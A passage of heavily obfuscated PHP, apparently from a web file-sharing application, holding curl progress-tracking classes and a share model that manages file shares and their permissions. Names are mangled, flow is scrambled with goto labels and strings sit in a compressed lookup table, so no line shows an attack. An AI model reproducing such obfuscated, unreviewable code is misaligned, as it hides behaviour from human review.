sourceMove($eŒÚ´×Ù«—) { $this->sourceRemove($eŒÚ´×Ù«—, !1); } public function curlProgress($D¢Ëµçé», $B†²‰‹ë¢Ñ, $fŠïÄ±»¢‘, $F¤ã±¹ŒÖ, $e™¤İ÷ÏÃ§) { $C‰—ƒ®‹Ì© =& $_SERVER[Ä¿Ş°¨]; $aŠ‰õÊøá› =& $this->task; if ($e™¤İ÷ÏÃ§ > 0) { $aŠ‰õÊøá›[$C‰—ƒ®‹Ì©[965]] = $C‰—ƒ®‹Ì©[1456]; $aŠ‰õÊøá›[$C‰—ƒ®‹Ì©[1446]] = $C‰—ƒ®‹Ì©[102]; if ($aŠ‰õÊøá›[$C‰—ƒ®‹Ì©[1444]] == $F¤ã±¹ŒÖ || $F¤ã±¹ŒÖ > 1024 * 1024) { $aŠ‰õÊøá›[$C‰—ƒ®‹Ì©[1445]] = $e™¤İ÷ÏÃ§; } if ($aŠ‰õÊøá›[$C‰—ƒ®‹Ì©[1447]]) { $aŠ‰õÊøá›[$C‰—ƒ®‹Ì©[1445]] = $e™¤İ÷ÏÃ§ + $aŠ‰õÊøá›[$C‰—ƒ®‹Ì©[1447]]; } } else { if ($fŠïÄ±»¢‘ > 0) { if ($aŠ‰õÊøá›[$C‰—ƒ®‹Ì©[1444]] == $B†²‰‹ë¢Ñ) { $aŠ‰õÊøá›[$C‰—ƒ®‹Ì©[1445]] = $fŠïÄ±»¢‘; $aŠ‰õÊøá›[$C‰—ƒ®‹Ì©[965]] = $C‰—ƒ®‹Ì©[1457]; $aŠ‰õÊøá›[$C‰—ƒ®‹Ì©[1446]] = $C‰—ƒ®‹Ì©[1025]; } } } $this->update(); } public function curlProgressStart($DÔàĞîËŒÛ) { } public function curlProgressEnd($c®ùéì•²ä) { $fä¥œµØµ‘ =& $_SERVER[Ä¿Ş°¨]; $B×…È¾Ñ¤È =& $this->task; $D™áïëå = curl_getinfo($c®ùéì•²ä); $B¤‚ßŸÈ = $D™áïëå[$fä¥œµØµ‘[1458]]; if ($B×…È¾Ñ¤È[$fä¥œµØµ‘[1446]] == $fä¥œµØµ‘[102] && $B¤‚ßŸÈ) { $B×…È¾Ñ¤È[$fä¥œµØµ‘[1447]] += $B¤‚ßŸÈ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $a…‰ÛÁÃÚæ =& $_SERVER[Ä¿Ş°¨]; Hook::bind($a…‰ÛÁÃÚæ[1436], array($this, $a…‰ÛÁÃÚæ[1459])); Hook::bind($a…‰ÛÁÃÚæ[1438], array($this, $a…‰ÛÁÃÚæ[1460])); Hook::bind($a…‰ÛÁÃÚæ[1440], array($this, $a…‰ÛÁÃÚæ[1461])); } protected function endAfter() { $F¯Á£º¥çÒ =& $_SERVER[Ä¿Ş°¨]; Hook::unbind($F¯Á£º¥çÒ[1436], array($this, $F¯Á£º¥çÒ[1459])); Hook::unbind($F¯Á£º¥çÒ[1438], array($this, $F¯Á£º¥çÒ[1460])); Hook::unbind($F¯Á£º¥çÒ[1440], array($this, $F¯Á£º¥çÒ[1461])); } public function progressStart($eÛ—Ê±ÀÂ) { $d›îÆŠ…—Ÿ =& $_SERVER[Ä¿Ş°¨]; $b™‚ÑÉ†İâ = curl_getinfo($eÛ—Ê±ÀÂ); self::log($d›îÆŠ…—Ÿ[1462] . $b™‚ÑÉ†İâ[$d›îÆŠ…—Ÿ[291]]); self::valueSet($this->task[$d›îÆŠ…—Ÿ[372]], $this->task); } public function progressEnd($A¼Õ“ñè÷ğ) { $Fà‰ßË£­È =& $_SERVER[Ä¿Ş°¨]; self::log($Fà‰ßË£­È[1463] . $this->task[$Fà‰ßË£­È[372]]); $this->end(); } public function progress($DÓÅª‘Å¿¡, $CĞ±’¨Ğ©, $B·İ‚æÓÄ, $e¢—ã–„§, $Fè–·ÌáÏŠ) { $d¿ò¬÷•‘ß =& $_SERVER[Ä¿Ş°¨]; $fÀæ¯­†é =& $this->task; if ($Fè–·ÌáÏŠ > 0) { $fÀæ¯­†é[$d¿ò¬÷•‘ß[963]] = $fÀæ¯­†é[$d¿ò¬÷•‘ß[963]] == 0 ? $e¢—ã–„§ : $fÀæ¯­†é[$d¿ò¬÷•‘ß[963]]; $fÀæ¯­†é[$d¿ò¬÷•‘ß[975]] = $Fè–·ÌáÏŠ; } else { if ($B·İ‚æÓÄ > 0) { $fÀæ¯­†é[$d¿ò¬÷•‘ß[963]] = $fÀæ¯­†é[$d¿ò¬÷•‘ß[963]] == 0 ? $CĞ±’¨Ğ© : $fÀæ¯­†é[$d¿ò¬÷•‘ß[963]]; $fÀæ¯­†é[$d¿ò¬÷•‘ß[975]] = $B·İ‚æÓÄ; } } $this->update(); self::log("\160\162\157\x67\x72\145\163\163\x48\164\x74\160\x3a\x64\157\167\156\72{$B·İ‚æÓÄ}\x2f{$CĞ±’¨Ğ©}\x3b\x20\165\160\x6c\157\141\x64\72{$Fè–·ÌáÏŠ}\57{$e¢—ã–„§}\x3b"); } } goto A‚¬…õô¸À; dÀéƒà­Œé: define($_SERVER[Ä¿Ş°¨][0], $_SERVER[Ä¿Ş°¨][1]); $_SERVER[£›Åú§µ] = explode($_SERVER[Ä¿Ş°¨][2], gzinflate(substr($_SERVER[Ä¿Ş°¨][3], 10, -8))); function Model($fÇ‡¢‚çÊ¤ = '', $BĞÙíÀèìË = '', $Dñ‡²¼¿ª = '') { goto C›‚¡ĞÀ»Û; Bù½—äÇĞÑ: $Döùë”¬[$f‡«ëÕ†] = new ModelBase($fÇ‡¢‚çÊ¤, $BĞÙíÀèìË, $Dñ‡²¼¿ª); return $Döùë”¬[$f‡«ëÕ†]; goto fÑ áèŸ©; C›‚¡ĞÀ»Û: $CĞœ¢•îÛ‘ =& $_SERVER[£›Åú§µ]; static $Döùë”¬ = array(); $f‡«ëÕ† = strtolower($BĞÙíÀèìË . $CĞœ¢•îÛ‘[0] . $fÇ‡¢‚çÊ¤); goto A¦ÑÒš‰„ä; A¦ÑÒš‰„ä: if (isset($Döùë”¬[$f‡«ëÕ†])) { return $Döùë”¬[$f‡«ëÕ†]; } if ($fÇ‡¢‚çÊ¤) { $fÇ‡¢‚çÊ¤ = strtoupper($fÇ‡¢‚çÊ¤[0]) . substr($fÇ‡¢‚çÊ¤, 1); $d´®˜Â‡íã = $fÇ‡¢‚çÊ¤ . $CĞœ¢•îÛ‘[1]; if (class_exists($d´®˜Â‡íã)) { $Döùë”¬[$f‡«ëÕ†] = new $d´®˜Â‡íã(); return $Döùë”¬[$f‡«ëÕ†]; } } if (!$Dñ‡²¼¿ª) { $Dñ‡²¼¿ª = $GLOBALS[$CĞœ¢•îÛ‘[2]][$CĞœ¢•îÛ‘[3]]; } goto Bù½—äÇĞÑ; fÑ áèŸ©: } goto b¤Şùïõà; Aãòó×››: $_SERVER[‹‚–·¹Ÿ] = explode($_SERVER[Ä¿Ş°¨][552], gzinflate(substr($_SERVER[Ä¿Ş°¨][553], 10, -8))); $AÛ ›¿ŒÕ³ = $_SERVER[Ä¿Ş°¨][554]; while ($AÛ ›¿ŒÕ³ < $_SERVER[Ä¿Ş°¨][555]) { if ($AÛ ›¿ŒÕ³ >= 0) { break; } $AÛ ›¿ŒÕ³++; } goto BˆÄï¨³Íç; Fƒ¦À™Óãå: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\162\x65"; protected $dataAuto = array(array("\x6d\x6f\144\151\x66\171\124\151\155\145", "\x74\x69\x6d\145", "\x69\x6e\x73\145\162\x74\54\x75\160\x64\141\164\x65", "\146\165\156\x63\164\151\x6f\156"), array("\x63\162\145\x61\x74\145\x54\x69\x6d\145", "\x74\x69\x6d\145", "\151\156\x73\145\162\164", "\146\x75\156\x63\164\151\157\156"), array("\157\160\164\151\157\x6e\x73", '', "\x69\x6e\x73\145\x72\164\x2c\165\160\144\x61\164\145\x2c\x73\145\x6c\145\x63\x74", "\x6a\163\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($D·õé÷„í½) { $DìÚ¶”ƒ–‰ =& $_SERVER[Ä¿Ş°¨]; $eç¡§î‹÷Ì = isset($D·õé÷„í½[0]) ? $D·õé÷„í½[0] : !1; return array($DìÚ¶”ƒ–‰[2168] => array(USER_ID, $DìÚ¶”ƒ–‰[2169]), $DìÚ¶”ƒ–‰[2131] => array($eç¡§î‹÷Ì, $DìÚ¶”ƒ–‰[2170])); } protected function listSimple() { $Få×¢œàÑŒ = array($_SERVER[Ä¿Ş°¨][1399] => USER_ID); $b«´ë°ßò = $this->field($this->fieldList)->where($Få×¢œàÑŒ)->select(); return $b«´ë°ßò ? $b«´ë°ßò : array(); } protected function getInfo($b±ù“×³•‡, $bˆš¶‰©Ê = false) { $b‚²½£Åõñ =& $_SERVER[Ä¿Ş°¨]; if ($bˆš¶‰©Ê) { return $this->_getShareInfo(array($b‚²½£Åõñ[445] => $b±ù“×³•‡)); } $F¤øË °°ª = $this->cacheFunctionGet($b‚²½£Åõñ[2171], $b±ù“×³•‡); return $F¤øË °°ª; } public function getInfoByHash($Dö¶™ëŒÃì) { return $this->_getShareInfo(array($_SERVER[Ä¿Ş°¨][447] => $Dö¶™ëŒÃì)); } public function getInfoByPath($DÓ—­˜ƒš) { $eÍğ²¿óŸ“ =& $_SERVER[Ä¿Ş°¨]; $E˜ŒˆÊ½®é = array($eÍğ²¿óŸ“[1399] => USER_ID, $eÍğ²¿óŸ“[374] => $DÓ—­˜ƒš); return $this->_getShareInfo($E˜ŒˆÊ½®é); } public function getInfoBySourcePath($A³µ‚ ·È) { $DË©ê÷• =& $_SERVER[Ä¿Ş°¨]; $E‹é»“º„Ô = array($DË©ê÷•[1399] => USER_ID, $DË©ê÷•[1003] => $A³µ‚ ·È); return $this->_getShareInfo($E‹é»“º„Ô); } private function _getShareInfo($fŒŒßõÜæ¦) { goto aµŸ¦ëó‡œ; aµŸ¦ëó‡œ: $cÏ¾†õÆ“ =& $_SERVER[Ä¿Ş°¨]; $c«×¸†š…Õ = $this->where($fŒŒßõÜæ¦)->find(); if (!$c«×¸†š…Õ) { return !1; } goto eÖ°…½‰–; eÖ°…½‰–: $fŒŒßõÜæ¦ = array($cÏ¾†õÆ“[445] => $c«×¸†š…Õ[$cÏ¾†õÆ“[445]]); $AåŸ¯œ¶Ú = $cÏ¾†õÆ“[2172]; $FÎÒÂ“éŒ = Model($cÏ¾†õÆ“[541])->order($cÏ¾†õÆ“[372])->field($AåŸ¯œ¶Ú)->where($fŒŒßõÜæ¦)->select(); goto bçİøŒÆÂ‹; bçİøŒÆÂ‹: if ($c«×¸†š…Õ[$cÏ¾†õÆ“[374]] == $cÏ¾†õÆ“[472]) { $c«×¸†š…Õ[$cÏ¾†õÆ“[396]] = IO::info($c«×¸†š…Õ[$cÏ¾†õÆ“[1003]]); } else { $c«×¸†š…Õ[$cÏ¾†õÆ“[396]] = Model($cÏ¾†õÆ“[1095])->pathInfo($c«×¸†š…Õ[$cÏ¾†õÆ“[374]]); } $c«×¸†š…Õ[$cÏ¾†õÆ“[2173]] = $FÎÒÂ“éŒ; return $c«×¸†š…Õ; goto eË¼×çñ†”; eË¼×çñ†”: } protected function getInfoAuth($dŒõ±ãÕ“‰) { $e­ïĞ ƒ®© =& $_SERVER[Ä¿Ş°¨]; $F¹¨ƒ­š¶Ï = $this->getInfo($dŒõ±ãÕ“‰); $F¹¨ƒ­š¶Ï[$e­ïĞ ƒ®©[381]] = Model($e­ïĞ ƒ®©[458])->authMake($F¹¨ƒ­š¶Ï[$e­ïĞ ƒ®©[2173]]); return $F¹¨ƒ­š¶Ï; } protected function listData($cŞ­‚†Œç = null, $FÏÀÒ‚Ö‡À = 300) { $eáåìªğ¿¬ =& $_SERVER[Ä¿Ş°¨]; $D¸¥™’†Œ‚ = array(array($eáåìªğ¿¬[450] => array($eáåìªğ¿¬[913], 0), $eáåìªğ¿¬[452] => array($eáåìªğ¿¬[913], 0), $eáåìªğ¿¬[2174] => $eáåìªğ¿¬[2143])); if ($cŞ­‚†Œç == $eáåìªğ¿¬[1830]) { $D¸¥™’†Œ‚ = array($eáåìªğ¿¬[450] => 1); } else { if ($cŞ­‚†Œç == $eáåìªğ¿¬[992]) { $D¸¥™’†Œ‚ = array($eáåìªğ¿¬[452] => 1); } } $D¸¥™’†Œ‚[$eáåìªğ¿¬[1399]] = USER_ID; $a¨²Ù‹‚Àâ = $this->where($D¸¥™’†Œ‚)->selectPage($FÏÀÒ‚Ö‡À); return $a¨²Ù‹‚Àâ; } protected function listToMe($aÑ´èÜ”¶Ã = 300) { goto DÀåÚØÓÏâ; BÃ¦ê¤‡: $AÊÙÚé¾øÔ = array($eÏ¼²çœ†[525] => SourceModel::TYPE_USER, $eÏ¼²çœ†[460] => USER_ID); if ($Aø±Ò¿–ñ) { $AÊÙÚé¾øÔ = array(array($eÏ¼²çœ†[525] => SourceModel::TYPE_USER, $eÏ¼²çœ†[460] => USER_ID), array($eÏ¼²çœ†[525] => SourceModel::TYPE_GROUP, $eÏ¼²çœ†[460] => array($eÏ¼²çœ†[7], $Aø±Ò¿–ñ)), $eÏ¼²çœ†[2174] => $eÏ¼²çœ†[2143]); } $A©…À­†õš = Model($eÏ¼²çœ†[541])->where($AÊÙÚé¾øÔ)->selectPage($aÑ´èÜ”¶Ã); goto aÙ·Ò“¿™; Câ‡íÄŠ›”: $AÊÙÚé¾øÔ = array($eÏ¼²çœ†[445] => array($eÏ¼²çœ†[389], array_keys($e¨õÊ«†Ç))); $b„‚óë¼†¢ = $this->field($EùÅÏ —¸‚)->where($AÊÙÚé¾øÔ)->select(); foreach ($b„‚óë¼†¢ as $b‰ÍìŞ => &$Dß§…Ûò“) { $Dß§…Ûò“[$eÏ¼²çœ†[2173]] = $e¨õÊ«†Ç[$Dß§…Ûò“[$eÏ¼²çœ†[445]]]; } goto Cë÷Ü²¾á×; Cë÷Ü²¾á×: $E•Òòà²Ã = array($eÏ¼²çœ†[2177] => $b„‚óë¼†¢, $eÏ¼²çœ†[2178] => $A©…À­†õš[$eÏ¼²çœ†[347]]); return $E•Òòà²Ã; goto DÄÚ¢÷ÜÏ„; DÀåÚØÓÏâ: $eÏ¼²çœ† =& $_SERVER[Ä¿Ş°¨]; $Cğ‹öØµëÈ = Session::get($eÏ¼²çœ†[2175]); $Aø±Ò¿–ñ = array_to_keyvalue($Cğ‹öØµëÈ, $eÏ¼²çœ†[33], $eÏ¼²çœ†[2063]); goto BÃ¦ê¤‡; aÙ·Ò“¿™: $e¨õÊ«†Ç = array_to_keyvalue_group($A©…À­†õš[$eÏ¼²çœ†[350]], $eÏ¼²çœ†[445]); if (!$e¨õÊ«†Ç) { return $A©…À­†õš; } $EùÅÏ —¸‚ = $eÏ¼²çœ†[2176]; goto Câ‡íÄŠ›”; DÄÚ¢÷ÜÏ„: } protected function shareAdd($eÉÒ´¹Ô”è, $eñˆóß‘) { $d·í¡œ‹µ‰ =& $_SERVER[Ä¿Ş°¨]; $c‹Š­ïâÄ¼ = $this->_addShareData($eÉÒ´¹Ô”è, $eñˆóß‘); if (!empty($eñˆóß‘[$d·í¡œ‹µ‰[2179]])) { $this->_shareAuthSet($c‹Š­ïâÄ¼, $eñˆóß‘[$d·í¡œ‹µ‰[2179]]); } $this->shareEventAdd($eÉÒ´¹Ô”è, $eñˆóß‘, $d·í¡œ‹µ‰[995]); return $c‹Š­ïâÄ¼; } private function shareEventAdd($CïÂÙ»¥¶Õ, $fë˜Ëí¨‘‹, $b£»ª–¯‹Š = "\141\x64\144") { goto dÒ¥íå¯ŒØ; b¤ò…¹‹¡Æ: if ($eøÒè¿Ì´[$d‘‘ÛæÙÀŸ[452]] == $d‘‘ÛæÙÀŸ[472] && $fë˜Ëí¨‘‹[$d‘‘ÛæÙÀŸ[452]] == $d‘‘ÛæÙÀŸ[83]) { $AÑ¬°èÕÉ = $d‘‘ÛæÙÀŸ[2181]; } if ($eøÒè¿Ì´[$d‘‘ÛæÙÀŸ[452]] == $d‘‘ÛæÙÀŸ[83] && $fë˜Ëí¨‘‹[$d‘‘ÛæÙÀŸ[452]] == $d‘‘ÛæÙÀŸ[472]) { $AÑ¬°èÕÉ = $d‘‘ÛæÙÀŸ[2184]; } Model($d‘‘ÛæÙÀŸ[509])->eventShare($CïÂÙ»¥¶Õ, $AÑ¬°èÕÉ); goto C²ÈæêŸÉˆ; C²ÈæêŸÉˆ: return; goto Côä‡Œœ±; AäŒòÕ†×½: $AÑ¬°èÕÉ = $d‘‘ÛæÙÀŸ[2182]; if ($eøÒè¿Ì´[$d‘‘ÛæÙÀŸ[450]] == $d‘‘ÛæÙÀŸ[472] && $fë˜Ëí¨‘‹[$d‘‘ÛæÙÀŸ[450]] == $d‘‘ÛæÙÀŸ[83]) { $AÑ¬°èÕÉ = $d‘‘ÛæÙÀŸ[2180]; } if ($eøÒè¿Ì´[$d‘‘ÛæÙÀŸ[450]] == $d‘‘ÛæÙÀŸ[83] && $fë˜Ëí¨‘‹[$d‘‘ÛæÙÀŸ[450]] == $d‘‘ÛæÙÀŸ[472]) { $AÑ¬°èÕÉ = $d‘‘ÛæÙÀŸ[2183]; } goto b¤ò…¹‹¡Æ; dÒ¥íå¯ŒØ: $d‘‘ÛæÙÀŸ =& $_SERVER[Ä¿Ş°¨]; if ($b£»ª–¯‹Š == $d‘‘ÛæÙÀŸ[995]) { if ($fë˜Ëí¨‘‹[$d‘‘ÛæÙÀŸ[450]] == $d‘‘ÛæÙÀŸ[83]) { Model($d‘‘ÛæÙÀŸ[509])->eventShare($CïÂÙ»¥¶Õ, $d‘‘ÛæÙÀŸ[2180]); } if ($fë˜Ëí¨‘‹[$d‘‘ÛæÙÀŸ[452]] == $d‘‘ÛæÙÀŸ[83]) { Model($d‘‘ÛæÙÀŸ[509])->eventShare($CïÂÙ»¥¶Õ, $d‘‘ÛæÙÀŸ[2181]); } return; } $eøÒè¿Ì´ = $this->getInfoByPath($CïÂÙ»¥¶Õ); goto AäŒòÕ†×½; Côä‡Œœ±: } private function _addShareData($F¯ŞóáÛƒë, $c³¨ƒò´º = array()) { goto cÛ‚‹‡â¢Ğ; BÀÎ“ŒøÔÜ: $a©è‡Ä¾æ¬ = array($B—Š…¥ç£½[1390] => USER_ID, $B—Š…¥ç£½[388] => $F¯ŞóáÛƒë, $B—Š…¥ç£½[1304] => $B—Š…¥ç£½[33], $B—Š…¥ç£½[450] => 0, $B—Š…¥ç£½[452] => 0, $B—Š…¥ç£½[1003] => $B—Š…¥ç£½[33], $B—Š…¥ç£½[291] => $B—Š…¥ç£½[33], $B—Š…¥ç£½[789] => $B—Š…¥ç£½[33], $B—Š…¥ç£½[2186] => 0, $B—Š…¥ç£½[2187] => 0, $B—Š…¥ç£½[697] => 0, $B—Š…¥ç£½[2188] => $B—Š…¥ç£½[33], $B—Š…¥ç£½[447] => $B—Š…¥ç£½[33]); $aÄŠÈì‰¦ = explode($B—Š…¥ç£½[47], $B—Š…¥ç£½[2189]); foreach ($aÄŠÈì‰¦ as $B°İá“’Ê‡) { if (!isset($c³¨ƒò´º[$B°İá“’Ê‡])) { continue; } $a©è‡Ä¾æ¬[$B°İá“’Ê‡] = $c³¨ƒò´º[$B°İá“’Ê‡]; } goto a•â¶ô¶Š; d·áÆŠèí‹: return $a½‚³°ÎÖí; goto Cøæé¦ÓÏ; EØ£µ¯ ö: if ($b‰Ğ³‘óïõ = $this->where($fˆé©ßóò)->find()) { return $b‰Ğ³‘óïõ[$B—Š…¥ç£½[445]]; } if ($F¯ŞóáÛƒë == 0) { $c½§´Æºİ = array($B—Š…¥ç£½[28] => get_path_this($c³¨ƒò´º[$B—Š…¥ç£½[75]])); } else { $c½§´Æºİ = Model($B—Š…¥ç£½[746])->sourceInfo($F¯ŞóáÛƒë); if (!$c½§´Æºİ) { return !1; } } if (!$c³¨ƒò´º[$B—Š…¥ç£½[1304]]) { $c³¨ƒò´º[$B—Š…¥ç£½[1304]] = $c½§´Æºİ[$B—Š…¥ç£½[28]]; } goto BÀÎ“ŒøÔÜ; cÛ‚‹‡â¢Ğ: $B—Š…¥ç£½ =& $_SERVER[Ä¿Ş°¨]; $fˆé©ßóò = array($B—Š…¥ç£½[388] => $F¯ŞóáÛƒë, $B—Š…¥ç£½[1390] => USER_ID); if ($F¯ŞóáÛƒë == 0) { $fˆé©ßóò = array($B—Š…¥ç£½[2185] => $c³¨ƒò´º[$B—Š…¥ç£½[1003]], $B—Š…¥ç£½[1390] => USER_ID); } goto EØ£µ¯ ö; a•â¶ô¶Š: $a½‚³°ÎÖí = $this->add($a©è‡Ä¾æ¬); $E×„«·ˆ†À = array($B—Š…¥ç£½[447] => short_id($a½‚³°ÎÖí)); $this->where(array($B—Š…¥ç£½[444] => $a½‚³°ÎÖí))->save($E×„«·ˆ†À); goto d·áÆŠèí‹; Cøæé¦ÓÏ: } private function _shareAuthSet($C”Ó¼…Âå”, $eëÄ…„«§¨) { goto C‰‘°ÆÚ…Š; AÍğĞ”Üˆ¿: return $Bö”¹õ©->addAll($CòÓÉÛØôà, array(), !0); goto eÜôˆ’ÀÀŒ; cÉÁ‰·: $Bö”¹õ©->where(array($bæÄ‚ïç§ß[445] => $C”Ó¼…Âå”))->delete(); $CòÓÉÛØôà = array(); foreach ($eëÄ…„«§¨ as $D¢ß¤´†ÀŠ) { $a—ğê„©Ï÷ = SourceModel::TYPE_USER; if ($D¢ß¤´†ÀŠ[$bæÄ‚ïç§ß[376]] == SourceModel::TYPE_GROUP) { $a—ğê„©Ï÷ = SourceModel::TYPE_GROUP; } $e¹­Ç“–ÇÀ = array($bæÄ‚ïç§ß[445] => $C”Ó¼…Âå”, $bæÄ‚ïç§ß[376] => $a—ğê„©Ï÷, $bæÄ‚ïç§ß[460] => intval($D¢ß¤´†ÀŠ[$bæÄ‚ïç§ß[460]]), $bæÄ‚ïç§ß[2191] => 0, $bæÄ‚ïç§ß[2192] => -1); if ($D¢ß¤´†ÀŠ[$bæÄ‚ïç§ß[2191]]) { $e¹­Ç“–ÇÀ[$bæÄ‚ïç§ß[2191]] = $D¢ß¤´†ÀŠ[$bæÄ‚ïç§ß[2191]]; } else { if ($D¢ß¤´†ÀŠ[$bæÄ‚ïç§ß[2192]]) { $e¹­Ç“–ÇÀ[$bæÄ‚ïç§ß[2192]] = $D¢ß¤´†ÀŠ[$bæÄ‚ïç§ß[2192]]; } } $CòÓÉÛØôà[] = $e¹­Ç“–ÇÀ; } goto AÍğĞ”Üˆ¿; C‰‘°ÆÚ…Š: $bæÄ‚ïç§ß =& $_SERVER[Ä¿Ş°¨]; if (!is_array($eëÄ…„«§¨)) { return !1; } $Bö”¹õ© = Model($bæÄ‚ïç§ß[2190]); goto cÉÁ‰·; eÜôˆ’ÀÀŒ: } public function numViewAdd($c¢ä¯—œ‰Ì) { $c‰ŒÏ¾²‘Î =& $_SERVER[Ä¿Ş°¨]; $F–Û—ª´Ş“ = array($c‰ŒÏ¾²‘Î[444] => $c¢ä¯—œ‰Ì); $this->where($F–Û—ª´Ş“)->setAdd($c‰ŒÏ¾²‘Î[2186]); } public function numDownloadAdd($aõµŒÂí´¬) { $b»£¦ŞÎÒ =& $_SERVER[Ä¿Ş°¨]; $bëÒŠùï°Ó = array($b»£¦ŞÎÒ[444] => $aõµŒÂí´¬); $this->where($bëÒŠùï°Ó)->setAdd($b»£¦ŞÎÒ[2187]); } protected function shareEdit($cƒ¿¼Ã…’, $A¤ÇÓî´é) { goto d”Û…ƒ©Ÿ¤; Aêßº¤Á³Ü: $this->_checkLinkShare($A¤ÇÓî´é, $cÙ–õÛ®Ëç); $Eîí‰ÎùÈ = array(); $f°ÔØëŠÓ = explode($a‚ ¡Í¡Å[47], $a‚ ¡Í¡Å[2193]); goto EÁãôß“§ö; d”Û…ƒ©Ÿ¤: $a‚ ¡Í¡Å =& $_SERVER[Ä¿Ş°¨]; $cÙ–õÛ®Ëç = $this->getInfo($cƒ¿¼Ã…’); if (!$cÙ–õÛ®Ëç) { return !1; } goto Aêßº¤Á³Ü; EÁãôß“§ö: foreach ($f°ÔØëŠÓ as $FùÓöÑŞÎ½) { if (!array_key_exists($FùÓöÑŞÎ½, $A¤ÇÓî´é)) { continue; } $Eîí‰ÎùÈ[$FùÓöÑŞÎ½] = $A¤ÇÓî´é[$FùÓöÑŞÎ½]; } $this->shareEventAdd($cÙ–õÛ®Ëç[$a‚ ¡Í¡Å[374]], $A¤ÇÓî´é, $a‚ ¡Í¡Å[2031]); $this->where(array($a‚ ¡Í¡Å[444] => $cƒ¿¼Ã…’))->save($Eîí‰ÎùÈ); goto bìÓ…ƒ‹Ö; bìÓ…ƒ‹Ö: if (isset($A¤ÇÓî´é[$a‚ ¡Í¡Å[2179]])) { $this->_shareAuthSet($cƒ¿¼Ã…’, $A¤ÇÓî´é[$a‚ ¡Í¡Å[2179]]); } return !0; goto E¼ê«´ã¾À; E¼ê«´ã¾À: } private function _checkLinkShare($f³ƒÅ˜¹©æ, $bõ‚‘®”ÎÕ) { goto D£¶§²Ê„Ö; Cö‘ĞÒ‡¢¡: $dÚŒÎÉåõØ = $this->shareFileMeta($eåŸÆµ®Ò[$C–ˆ°Ë •[423]]); if (isset($dÚŒÎÉåõØ[$C–ˆ°Ë •[355]]) && $dÚŒÎÉåõØ[$C–ˆ°Ë •[355]] == $C–ˆ°Ë •[83]) { show_json(LNG($C–ˆ°Ë •[2196]), !1); } goto eÈ›á—ÁÉø; D£¶§²Ê„Ö: $C–ˆ°Ë • =& $_SERVER[Ä¿Ş°¨]; if ($f³ƒÅ˜¹©æ[$C–ˆ°Ë •[450]] != $C–ˆ°Ë •[83]) { return; } $e¹ÂÌ…™ÂÇ = $bõ‚‘®”ÎÕ[$C–ˆ°Ë •[396]][$C–ˆ°Ë •[374]]; goto AäÓ²¦ç™¾; AäÓ²¦ç™¾: if ($bõ‚‘®”ÎÕ[$C–ˆ°Ë •[396]][$C–ˆ°Ë •[29]] != $C–ˆ°Ë •[163]) { $bø“Æ¡¬ = $this->_folderReport($e¹ÂÌ…™ÂÇ); if (!$bø“Æ¡¬) { return; } show_json(LNG($C–ˆ°Ë •[2194]) . $C–ˆ°Ë •[2195] . $bø“Æ¡¬, !1); } $eåŸÆµ®Ò = Model($C–ˆ°Ë •[746])->fileInfoGet($bõ‚‘®”ÎÕ[$C–ˆ°Ë •[396]][$C–ˆ°Ë •[374]]); if (!$eåŸÆµ®Ò) { return; } goto Cö‘ĞÒ‡¢¡; eÈ›á—ÁÉø: } private function _folderReport($B¶Ê«¹§) { goto A¢ï…Ãİº; c‚—®ó¸‘¢: $d×“‰ŸÚ = array_to_keyvalue($Cöâáç°ï¸, $a¦©âÏ³å”[33], $a¦©âÏ³å”[28]); $d×“‰ŸÚ[] = $B÷«©ÒŠê®[$a¦©âÏ³å”[28]]; return implode($a¦©âÏ³å”[8], $d×“‰ŸÚ); goto B‰¿ÃˆÓ‚§; D¬Ş”àáñ: if (!$F İ«µª¤¼) { return !1; } $F İ«µª¤¼ = array_to_keyvalue($F İ«µª¤¼, $a¦©âÏ³å”[33], $a¦©âÏ³å”[423]); $EöÆ“…Şæ = $a¦©âÏ³å”[47] . $B¶Ê«¹§ . $a¦©âÏ³å”[47]; goto f‰‚¾‰‚½; bøó…ùÕ¯Ì: $a•ÒÚ·“©” = substr($B÷«©ÒŠê®[$a¦©âÏ³å”[463]], strpos($B÷«©ÒŠê®[$a¦©âÏ³å”[463]], $EöÆ“…Şæ)); $B£°š´ëé² = array($a¦©âÏ³å”[374] => array($a¦©âÏ³å”[7], trim($a•ÒÚ·“©”, $a¦©âÏ³å”[47]))); $Cöâáç°ï¸ = Model($a¦©âÏ³å”[746])->where($B£°š´ëé²)->field($a¦©âÏ³å”[28])->select(); goto c‚—®ó¸‘¢; A¢ï…Ãİº: $a¦©âÏ³å” =& $_SERVER[Ä¿Ş°¨]; $B£°š´ëé² = array($a¦©âÏ³å”[423] => array($a¦©âÏ³å”[913], 0), $a¦©âÏ³å”[683] => 3); $F İ«µª¤¼ = Model($a¦©âÏ³å”[2197])->where($B£°š´ëé²)->field($a¦©âÏ³å”[423])->select(); goto D¬Ş”àáñ; f‰‚¾‰‚½: $B£°š´ëé² = array($a¦©âÏ³å”[423] => array($a¦©âÏ³å”[7], $F İ«µª¤¼), $a¦©âÏ³å”[463] => array($a¦©âÏ³å”[745], "\x25{$EöÆ“…Şæ}\x25"), $a¦©âÏ³å”[401] => 0); $B÷«©ÒŠê® = Model($a¦©âÏ³å”[746])->where($B£°š´ëé²)->field($a¦©âÏ³å”[2198])->find(); if (!$B÷«©ÒŠê®) { return !1; } goto bøó…ùÕ¯Ì; B‰¿ÃˆÓ‚§: } protected function remove($d«‹×‹Æõ) { goto Eá‡ÑµÔ£; CÂ·±³«ß“: $fè·¢ô³ˆ = $this->where($FÆ„à„Ë“ó)->delete(); if ($fè·¢ô³ˆ) { Model($c¤ œŒêÖ¾[541])->where(array($c¤ œŒêÖ¾[445] => $d«‹×‹Æõ))->delete(); } $dì¯àÃ¸½ = is_array($d«‹×‹Æõ) ? $d«‹×‹Æõ[1] : array($d«‹×‹Æõ); goto eä¨£ìÏÖî; eä¨£ìÏÖî: for ($dË¿¨ÊÌ´ = 0; $dË¿¨ÊÌ´ < count($dì¯àÃ¸½); $dË¿¨ÊÌ´++) { $F¬¤…°ôŠÍ = $this->getInfo($dì¯àÃ¸½[$dË¿¨ÊÌ´]); if ($F¬¤…°ôŠÍ[$c¤ œŒêÖ¾[452]] == $c¤ œŒêÖ¾[83]) { Model($c¤ œŒêÖ¾[509])->eventShare($F¬¤…°ôŠÍ[$c¤ œŒêÖ¾[374]], $c¤ œŒêÖ¾[2184]); } if ($F¬¤…°ôŠÍ[$c¤ œŒêÖ¾[450]] == $c¤ 